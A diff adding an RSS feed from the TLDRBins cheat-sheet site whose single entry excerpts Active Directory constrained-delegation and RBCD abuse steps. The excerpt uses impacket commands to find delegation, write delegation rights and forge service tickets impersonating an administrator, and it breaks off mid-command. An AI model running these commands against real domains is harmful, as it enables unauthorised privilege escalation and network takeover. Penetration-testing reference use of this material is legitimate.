@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Constrained Delegation on TLDRBins</title>
+    <link>https://tldrbins.github.io/@constrained-delegation/</link>
+    <description>Recent content in Constrained Delegation on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@constrained-delegation/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Constrained Delegation</title>
+      <link>https://tldrbins.github.io/constrained_delegation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
+      <description>Abuse #1: RBCD Attack 1. Find delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k impacket-getST -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -self # Check forwardable flag describeTicket.py &amp;lt;TICKET_1&amp;gt;.ccache 2. RBCD # Add delegation impacket-rbcd &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -delegate-from &amp;lt;USERNAME&amp;gt; -delegate-to &amp;lt;TARGET_1&amp;gt; -action write -dc-ip &amp;lt;DC&amp;gt; -use-ldaps # Check sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k # Impersonate impacket-getST &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USERNAME&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;DC&amp;gt; -impersonate &amp;lt;TARGET_2&amp;gt; # Check forwardable flag describeTicket.</description>
+    </item>
+  </channel>
+</rss>
